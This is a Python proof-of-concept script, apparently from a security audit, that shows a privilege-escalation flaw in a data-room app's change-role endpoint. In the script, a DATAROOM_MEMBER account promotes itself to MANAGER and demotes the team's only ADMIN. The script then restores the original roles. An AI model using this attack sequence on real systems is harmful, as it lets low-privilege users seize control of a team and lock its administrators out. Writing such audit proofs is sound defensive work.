#!/usr/bin/env python3
"""PM-20 — a DATAROOM_MEMBER promotes itself to MANAGER through change-role, then
demotes the team's only ADMIN, leaving the team with no admin.

Every role change is read back from the database, and the original roles and room
assignments are restored in `finally`.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/pm-20-change-role-privilege-escalation/poc.py
"""
import sys
import pathlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db, db_close, get, put, mint_cookie,
    VULN, CONTROL, OBSERVE, log, summary,
)

# ---- discover the actors from the database (robust to a reseed) -------------
alice = db('select id, "teamId" from "User" u join "UserTeam" ut on ut."userId"=u.id '
           "where u.email=$1 and ut.role='ADMIN'", ["alice@victim.test"])[0]
TEAM = alice["teamId"]
ALICE_ID = alice["id"]
CAROL_ID = db('select u.id from "User" u join "UserTeam" ut on ut."userId"=u.id '
              "where ut.\"teamId\"=$1 and ut.role='DATAROOM_MEMBER' and u.email like 'carol%' "
              "order by u.\"createdAt\" limit 1", [TEAM])[0]["id"]

CAROL = mint_cookie(db('select email from "User" where id=$1', [CAROL_ID])[0]["email"])
ALICE = mint_cookie("alice@victim.test")
MALLORY = mint_cookie("mallory@attacker.test")  # ADMIN of an unrelated tenant


def change_role(body, cookie=None):
    return put(f"/api/teams/{TEAM}/change-role", body, cookie)[0]


def role(uid):
    r = db('select role from "UserTeam" where "userId"=$1 and "teamId"=$2', [uid, TEAM])
    return r[0]["role"] if r else None


def admins():
    return db('select count(*)::int n from "UserTeam" where "teamId"=$1 and role=\'ADMIN\'',
              [TEAM])[0]["n"]


log(f"PM-20 — change-role has no members.write check   base={BASE}  team={TEAM}")
log("")

snapshot = db('select "userId", role from "UserTeam" where "teamId"=$1', [TEAM])
room_snapshot = db('select "userId","teamId","dataroomId" from "UserDataroom" where "teamId"=$1',
                   [TEAM])

try:
    # ---- baseline ----------------------------------------------------------
    CONTROL("carol starts as DATAROOM_MEMBER", role(CAROL_ID) == "DATAROOM_MEMBER")
    CONTROL("alice starts as ADMIN, and is the team's only ADMIN",
            role(ALICE_ID) == "ADMIN" and admins() == 1)
    carol_rooms = db('select count(*)::int n from "UserDataroom" where "userId"=$1 and "teamId"=$2',
                     [CAROL_ID, TEAM])[0]["n"]
    CONTROL("carol has zero room entitlements", carol_rooms == 0, f"rooms={carol_rooms}")
    docs_before = get(f"/api/teams/{TEAM}/documents", CAROL)[0]
    CONTROL("as DATAROOM_MEMBER, carol is refused the team document list",
            docs_before == 403, f"status={docs_before}")

    # ---- the route's own partial guards (these DO fire) --------------------
    CONTROL("no session -> 401",
            change_role({"userToBeChanged": CAROL_ID, "role": "MANAGER"}) == 401)
    CONTROL("a different tenant's admin -> 401",
            change_role({"userToBeChanged": CAROL_ID, "role": "MANAGER"}, MALLORY) == 401)
    to_admin = change_role({"userToBeChanged": CAROL_ID, "role": "ADMIN"}, CAROL)
    CONTROL("carol asking for ADMIN -> 403",
            to_admin == 403 and role(CAROL_ID) == "DATAROOM_MEMBER", f"status={to_admin}")
    to_drm = change_role({"userToBeChanged": ALICE_ID, "role": "DATAROOM_MEMBER",
                          "dataroomIds": []}, CAROL)
    CONTROL("carol assigning DATAROOM_MEMBER -> 403",
            to_drm == 403 and role(ALICE_ID) == "ADMIN", f"status={to_drm}")

    # ---- attack 1: self-promotion -----------------------------------------
    up = change_role({"userToBeChanged": CAROL_ID, "role": "MANAGER"}, CAROL)
    carol_now = role(CAROL_ID)
    OBSERVE("self-promotion response", f"status={up}")
    VULN("carol promotes herself DATAROOM_MEMBER -> MANAGER",
         up == 204 and carol_now == "MANAGER", f"db role={carol_now}")
    docs_after = get(f"/api/teams/{TEAM}/documents", CAROL)[0]
    VULN("the promotion is effective: carol now reads the team document list",
         docs_after == 200, f"status={docs_after}")

    # ---- attack 2: demote the admin ---------------------------------------
    down = change_role({"userToBeChanged": ALICE_ID, "role": "MEMBER"}, CAROL)
    alice_now = role(ALICE_ID)
    OBSERVE("admin demotion response", f"status={down}")
    VULN("carol demotes the team's ADMIN to MEMBER",
         down == 204 and alice_now == "MEMBER", f"db role={alice_now}")
    n_admins = admins()
    VULN("the team is left with zero ADMINs", n_admins == 0, f"admins={n_admins}")

    # ---- consequence: no in-product recovery ------------------------------
    back = change_role({"userToBeChanged": ALICE_ID, "role": "ADMIN"}, ALICE)
    VULN("alice cannot restore herself to ADMIN through the product",
         back == 403 and role(ALICE_ID) == "MEMBER", f"status={back}")
finally:
    for r in snapshot:
        db('update "UserTeam" set role=$1 where "userId"=$2 and "teamId"=$3',
           [r["role"], r["userId"], TEAM])
    db('delete from "UserDataroom" where "teamId"=$1', [TEAM])
    for r in room_snapshot:
        db('insert into "UserDataroom" ("id","userId","teamId","dataroomId") '
           "values (gen_random_uuid()::text,$1,$2,$3)",
           [r["userId"], r["teamId"], r["dataroomId"]])
    after = db('select "userId", role from "UserTeam" where "teamId"=$1 order by "userId"', [TEAM])
    same = sorted((r["userId"], r["role"]) for r in after) == \
        sorted((r["userId"], r["role"]) for r in snapshot)
    log("")
    log(f"  restore: roles {'match the pre-run snapshot' if same else 'DO NOT MATCH — inspect manually'}")

summary("PM-20 change-role / DATAROOM_MEMBER escalation and admin demotion")
db_close()
